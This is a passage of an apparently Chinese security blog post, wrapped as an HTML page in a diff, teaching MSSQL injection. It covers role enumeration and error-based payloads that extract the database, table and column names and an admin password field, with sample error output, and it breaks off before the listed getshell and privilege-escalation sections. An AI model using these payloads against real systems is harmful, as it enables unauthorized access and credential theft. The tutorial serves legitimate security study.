@@ -1,0 +1,1042 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    MSSQL注入getshell与提权 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="MSSQL注入 库介绍： 1234567master   &#x2F;&#x2F;用于记录所有SQL Server系统级别的信息，这些信息用于控制用户数据库和数据操作。model    &#x2F;&#x2F;SQL Server为用户数据库提供的样板，新的用户数据库都以model数据库为基础msdb     &#x2F;&#x2F;由 Enterprise Manager和Agent使用，记录着任务计划信息、事件处理信息、数据备份及恢复信息、警告及异常">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MSSQL注入getshell与提权">
+<meta property="og:url" content="http://example.com/2026/06/13/MSSQL%E6%B3%A8%E5%85%A5getshell%E4%B8%8E%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="MSSQL注入 库介绍： 1234567master   &#x2F;&#x2F;用于记录所有SQL Server系统级别的信息，这些信息用于控制用户数据库和数据操作。model    &#x2F;&#x2F;SQL Server为用户数据库提供的样板，新的用户数据库都以model数据库为基础msdb     &#x2F;&#x2F;由 Enterprise Manager和Agent使用，记录着任务计划信息、事件处理信息、数据备份及恢复信息、警告及异常">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2026/06/13/MSSQL%E6%B3%A8%E5%85%A5getshell%E4%B8%8E%E6%8F%90%E6%9D%83/MSSQL%E6%B3%A8%E5%85%A5getshell%E4%B8%8E%E6%8F%90%E6%9D%83.assets/20190517130435.png">
+<meta property="article:published_time" content="2026-06-13T12:06:47.000Z">
+<meta property="article:modified_time" content="2026-09-21T13:27:03.512Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2026/06/13/MSSQL%E6%B3%A8%E5%85%A5getshell%E4%B8%8E%E6%8F%90%E6%9D%83/MSSQL%E6%B3%A8%E5%85%A5getshell%E4%B8%8E%E6%8F%90%E6%9D%83.assets/20190517130435.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="MSSQL注入getshell与提权">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">MSSQL注入getshell与提权</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#mssql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text"> MSSQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text"> 基础信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%A6%E5%8F%B7"><span class="toc-number">1.2.</span> <span class="toc-text"> 符号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="toc-number">1.3.</span> <span class="toc-text"> 基本注入流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.</span> <span class="toc-text"> 报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.</span> <span class="toc-text"> 联合查询注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.6.</span> <span class="toc-text"> 布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.7.</span> <span class="toc-text"> 时间盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-number">2.</span> <span class="toc-text"> getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84"><span class="toc-number">2.1.</span> <span class="toc-text"> 寻找绝对路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xp_cmdshell%E6%8B%BFshell"><span class="toc-number">2.2.</span> <span class="toc-text"> xp_cmdshell拿shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BD%E6%8B%BFshell"><span class="toc-number">2.3.</span> <span class="toc-text"> 差异备份拿shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#log%E5%A4%87%E4%BB%BD%E6%8B%BFshell"><span class="toc-number">2.4.</span> <span class="toc-text"> log备份拿shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83-getsystem"><span class="toc-number">3.</span> <span class="toc-text"> 提权-getsystem</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#xp_cmdshell"><span class="toc-number">3.1.</span> <span class="toc-text"> xp_cmdshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sp_oacreate"><span class="toc-number">3.2.</span> <span class="toc-text"> sp_oacreate</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B2%99%E7%9B%92%E6%8F%90%E6%9D%83"><span class="toc-number">3.3.</span> <span class="toc-text"> 沙盒提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xp_regwrite"><span class="toc-number">3.4.</span> <span class="toc-text"> xp_regwrite</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-MSSQL注入getshell与提权" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2026/06/13/MSSQL%E6%B3%A8%E5%85%A5getshell%E4%B8%8E%E6%8F%90%E6%9D%83/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2026-06-13T12:06:47.000Z" itemprop="datePublished">2026-06-13</time>
+    <time style="display: none;" id="post-update-time">2026-09-21</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F/" data-aos="zoom-in">渗透</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h2 id="mssql注入"><a class="markdownIt-Anchor" href="#mssql注入"></a> MSSQL注入</h2>
+<p>库介绍：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">master   <span class="comment">//用于记录所有SQL Server系统级别的信息，这些信息用于控制用户数据库和数据操作。</span></span><br><span class="line"></span><br><span class="line">model    <span class="comment">//SQL Server为用户数据库提供的样板，新的用户数据库都以model数据库为基础</span></span><br><span class="line"></span><br><span class="line">msdb     <span class="comment">//由 Enterprise Manager和Agent使用，记录着任务计划信息、事件处理信息、数据备份及恢复信息、警告及异常信息。</span></span><br><span class="line"></span><br><span class="line">tempdb   <span class="comment">//它为临时表和其他临时工作提供了一个存储区。</span></span><br></pre></td></tr></table></figure>
+<p>其中最主要的是<code>master</code>数据库，其中存储了所有的数据库名等，还有很多<code>存储过程</code></p>
+<blockquote>
+<p>存储过程是一组为了完成特定功能的SQL 语句集，它存储在数据库中，一次编译后永久有效，用户通过指定存储过程的名字并给出参数（如果该存储过程带有参数）来执行它。实际上就是一个封装好的函数，具有面向对象特点。</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://y4er.com/img/uploads/20190517130435.png"><img src="MSSQL%E6%B3%A8%E5%85%A5getshell%E4%B8%8E%E6%8F%90%E6%9D%83.assets/20190517130435.png" alt="image.jpg" /></a></p>
+<p>在master数据库中有<code>master.dbo.sysdatabases</code>视图，储存所有数据库名,其他数据库的视图则储存他本库的表名与列名。 每一个库的视图表都有<code>syscolumns</code>存储着所有的字段，可编程性储存着我们的函数。</p>
+<p>mssql的存储过程天然支持多语句，为我们的注入提供了遍历。</p>
+<p>增删改查和MySQL数据库大同小异</p>
+<h3 id="基础信息收集"><a class="markdownIt-Anchor" href="#基础信息收集"></a> 基础信息收集</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">服务器级的固定角色</th>
+<th style="text-align:left">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">sysadmin</td>
+<td style="text-align:left">sysadmin 固定服务器角色的成员可以在服务器上执行任何活动。</td>
+</tr>
+<tr>
+<td style="text-align:left">serveradmin</td>
+<td style="text-align:left">serveradmin 固定服务器角色的成员可以更改服务器范围的配置选项和关闭服务器。</td>
+</tr>
+<tr>
+<td style="text-align:left">securityadmin</td>
+<td style="text-align:left">securityadmin 固定服务器角色的成员可以管理登录名及其属性。 他们可以 <code>GRANT</code>、<code>DENY</code> 和 <code>REVOKE</code> 服务器级权限。 他们还可以 <code>GRANT</code>、<code>DENY</code> 和 <code>REVOKE</code> 数据库级权限（如果他们具有数据库的访问权限）。 此外，他们还可以重置 SQL Server 登录名的密码。 重要说明： 如果能够授予对 数据库引擎 的访问权限和配置用户权限，安全管理员可以分配大多数服务器权限。 securityadmin 角色应视为与 sysadmin 角色等效。</td>
+</tr>
+<tr>
+<td style="text-align:left">processadmin</td>
+<td style="text-align:left">processadmin 固定服务器角色的成员可以终止在 SQL Server 实例中运行的进程。</td>
+</tr>
+<tr>
+<td style="text-align:left">setupadmin</td>
+<td style="text-align:left">setupadmin 固定服务器角色的成员可以使用 Transact-SQL 语句添加和删除链接服务器。 （使用 Management Studio 时需要 sysadmin 成员资格。）</td>
+</tr>
+<tr>
+<td style="text-align:left">bulkadmin</td>
+<td style="text-align:left">bulkadmin 固定服务器角色的成员可以运行 <code>BULK INSERT</code> 语句。</td>
+</tr>
+<tr>
+<td style="text-align:left">diskadmin</td>
+<td style="text-align:left">diskadmin 固定服务器角色用于管理磁盘文件。</td>
+</tr>
+<tr>
+<td style="text-align:left">dbcreator</td>
+<td style="text-align:left">dbeator 固务器角色的成员可以创建、更改、删除和还原任何数据库。</td>
+</tr>
+<tr>
+<td style="text-align:left">puic</td>
+<td style="text-align:left">每个 SQL Server 登录名都属于 public 服务器角色。 如果未向某个服务器主体授予或拒绝对某个安全对象的特定权限，该用户将继承授予该对象的 public 角色的权限。 只有在希望所有用户都能使用对象时，才在对象上分配 Public 权限。 你无法更改具有 Public 角色的成员身份。 注意plic 与其他角色的实现方式不同，可通过 public 固定服务器角色授予、拒绝或调用权限。</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">固定数据库角色名</th>
+<th style="text-align:left">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">db_owner</td>
+<td style="text-align:left">db_owner 固定数据库角色的成员可以执行数据库的所有配置和维护活动，还可以删除 SQL Server中的数据库。 （在 SQL 数据库 和 SQL 数据仓库中，某些维护活动需要服务器级别权限，并且不能由 db_owners执行。）</td>
+</tr>
+<tr>
+<td style="text-align:left">db_securityadmin</td>
+<td style="text-align:left">db_securityadmin 固定数据库角色的成员可以仅修改自定义角色的角色成员资格、创建无登录名的用户和管理权限。 向此角色中添加主体可能会导致意外的权限升级。</td>
+</tr>
+<tr>
+<td style="text-align:left">db_accessadmin</td>
+<td style="text-align:left">db_accessadmin 固定数据库角色的成员可以为 Windows 登录名、Windows 组和 SQL Server 登录名添加或删除数据库访问权限。</td>
+</tr>
+<tr>
+<td style="text-align:left">db_backupoperator</td>
+<td style="text-align:left">db_backupoperator 固定数据库角色的成员可以备份数据库。</td>
+</tr>
+<tr>
+<td style="text-align:left">db_ddladmin</td>
+<td style="text-align:left">db_ddladmin 固定数据库角色的成员可以在数据库中运行任何数据定义语言 (DDL) 命令。</td>
+</tr>
+<tr>
+<td style="text-align:left">db_datawriter</td>
+<td style="text-align:left">db_datawriter 固定数据库角色的成员可以在所有用户表中添加、删除或更改数据。</td>
+</tr>
+<tr>
+<td style="text-align:left">db_datareader</td>
+<td style="text-align:left">db_datareader 固定数据库角色的成员可以从所有用户表中读取所有数据。</td>
+</tr>
+<tr>
+<td style="text-align:left">db_denydatawriter</td>
+<td style="text-align:left">db_denydatawriter 固定数据库角色的成员不能添加、修改或删除数据库内用户表中的任何数据。</td>
+</tr>
+<tr>
+<td style="text-align:left">db_denydatareader</td>
+<td style="text-align:left">db_denydatareader 固定数据库角色的成员不能读取数据库内用户表中的任何数据。</td>
+</tr>
+</tbody>
+</table>
+<p>我们可以用<code>IS_SRVROLEMEMBER</code>来判断服务器级别的固定角色</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">返回值</th>
+<th style="text-align:left">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">0</td>
+<td style="text-align:left">login 不是 role 的成员。</td>
+</tr>
+<tr>
+<td style="text-align:left">1</td>
+<td style="text-align:left">login 是 role 的成员。</td>
+</tr>
+<tr>
+<td style="text-align:left">NULL</td>
+<td style="text-align:left">role 或 login 无效，或者没有查看角色成员身份的权限。</td>
+</tr>
+</tbody>
+</table>
+<p>构造语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">and 1=(select is_srvrolemember(&#x27;sysadmin&#x27;))</span><br><span class="line"></span><br><span class="line">and 1=(select is_srvrolemember(&#x27;serveradmin&#x27;))</span><br><span class="line"></span><br><span class="line">and 1=(select is_srvrolemember(&#x27;setupadmin&#x27;))</span><br><span class="line"></span><br><span class="line">and 1=(select is_srvrolemember(&#x27;securityadmin&#x27;))</span><br><span class="line"></span><br><span class="line">and 1=(select is_srvrolemember(&#x27;diskadmin&#x27;))</span><br><span class="line"></span><br><span class="line">and 1=(select is_srvrolemember(&#x27;bulkadmin&#x27;))</span><br></pre></td></tr></table></figure>
+<p>数据库级别的应用角色用<code>IS_MEMBER</code>函数判断</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT IS_MEMBER(&#x27;db_owner&#x27;)</span><br></pre></td></tr></table></figure>
+<p>再来看一些基本信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@version; //版本</span><br><span class="line">SELECT user;		//用户</span><br><span class="line">SELECT DB_NAME();	//当前数据库名，你可以用db_name(n)来遍历出所有的数据库</span><br><span class="line">SELECT @@servername;	//主机名</span><br></pre></td></tr></table></figure>
+<p>那么站库分离可以这么来判断</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id=&#x27;1&#x27;and host_name()=@@servername;--&#x27;</span><br></pre></td></tr></table></figure>
+<h3 id="符号"><a class="markdownIt-Anchor" href="#符号"></a> 符号</h3>
+<p>注释符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/* </span><br><span class="line">--</span><br><span class="line">;%00</span><br></pre></td></tr></table></figure>
+<p>空白符号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20	</span><br><span class="line"></span><br><span class="line">/**/</span><br></pre></td></tr></table></figure>
+<p>运算</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">--基本的不列举了，举几个特殊的</span><br><span class="line">ALL 如果一组的比较都为true，则比较结果为true</span><br><span class="line">AND 如果两个布尔表达式都为true，则结果为true；如果其中一个表达式为false，则结果为false</span><br><span class="line">ANY 如果一组的比较中任何一个为true，则结果为true</span><br><span class="line">BETWEEN 如果操作数在某个范围之内，那么结果为true</span><br><span class="line">EXISTS  如果子查询中包含了一些行，那么结果为true</span><br><span class="line">IN  如果操作数等于表达式列表中的一个，那么结果为true</span><br><span class="line">LIKE    如果操作数与某种模式相匹配，那么结果为true</span><br><span class="line">NOT 对任何其他布尔运算符的结果值取反</span><br><span class="line">OR  如果两个布尔表达式中的任何一个为true，那么结果为true</span><br><span class="line">SOME    如果在一组比较中，有些比较为true，那么结果为true</span><br></pre></td></tr></table></figure>
+<h3 id="基本注入流程"><a class="markdownIt-Anchor" href="#基本注入流程"></a> 基本注入流程</h3>
+<p>此处利用mssql数据类型不一样比较报错，爆出当前数据库名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Fanmv_Admin WHERE AdminID=1 and DB_NAME()&gt;1;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在将 nvarchar 值 &#x27;FanmvCMS&#x27; 转换成数据类型 int 时失败。</span><br></pre></td></tr></table></figure>
+<p>爆表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Fanmv_Admin WHERE AdminID=1 and 1=(SELECT TOP 1 name from sysobjects WHERE xtype=&#x27;u&#x27;);</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在将 nvarchar 值 &#x27;Fanmv_Admin&#x27; 转换成数据类型 int 时失败。</span><br></pre></td></tr></table></figure>
+<p>此处<code>xtype</code>可以是下列对象类型中的一种：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">缩写</th>
+<th style="text-align:left">全称</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">C</td>
+<td style="text-align:left">CHECK 约束</td>
+</tr>
+<tr>
+<td style="text-align:center">D</td>
+<td style="text-align:left">默认值或 DEFAULT 约束</td>
+</tr>
+<tr>
+<td style="text-align:center">F</td>
+<td style="text-align:left">FOREIGN KEY 约束</td>
+</tr>
+<tr>
+<td style="text-align:center">L</td>
+<td style="text-align:left">日志</td>
+</tr>
+<tr>
+<td style="text-align:center">FN</td>
+<td style="text-align:left">标量函数</td>
+</tr>
+<tr>
+<td style="text-align:center">IF</td>
+<td style="text-align:left">内嵌表函数</td>
+</tr>
+<tr>
+<td style="text-align:center">P</td>
+<td style="text-align:left">存储过程</td>
+</tr>
+<tr>
+<td style="text-align:center">PK</td>
+<td style="text-align:left">PRIMARY KEY 约束（类型是 K）</td>
+</tr>
+<tr>
+<td style="text-align:center">RF</td>
+<td style="text-align:left">复制筛选存储过程</td>
+</tr>
+<tr>
+<td style="text-align:center">S</td>
+<td style="text-align:left">系统表</td>
+</tr>
+<tr>
+<td style="text-align:center">TF</td>
+<td style="text-align:left">表函数</td>
+</tr>
+<tr>
+<td style="text-align:center">TR</td>
+<td style="text-align:left">触发器</td>
+</tr>
+<tr>
+<td style="text-align:center">U</td>
+<td style="text-align:left">用户表</td>
+</tr>
+<tr>
+<td style="text-align:center">UQ</td>
+<td style="text-align:left">UNIQUE 约束（类型是 K）</td>
+</tr>
+<tr>
+<td style="text-align:center">V</td>
+<td style="text-align:left">视图</td>
+</tr>
+<tr>
+<td style="text-align:center">X</td>
+<td style="text-align:left">扩展存储过程</td>
+</tr>
+</tbody>
+</table>
+<p>此处的<code>sysobjects</code>等同于<code> [master].[sys].[objects]</code></p>
+<p>爆列名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Fanmv_Admin WHERE AdminID=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = &#x27;Fanmv_Admin&#x27;));</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在将 nvarchar 值 &#x27;AdminID&#x27; 转换成数据类型 int 时失败。</span><br><span class="line">&gt; [22018] [Microsoft][SQL Server Native Client 10.0][SQL Server]在将 nvarchar 值 &#x27;AdminID&#x27; 转换成数据类型 int 时失败。 (245)</span><br></pre></td></tr></table></figure>
+<p>爆数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Fanmv_Admin WHERE AdminID=1 and 1=(SELECT TOP 1 AdminPass from Fanmv_Admin); -- AdminPass 是字符串，与 int 比较报错</span><br></pre></td></tr></table></figure>
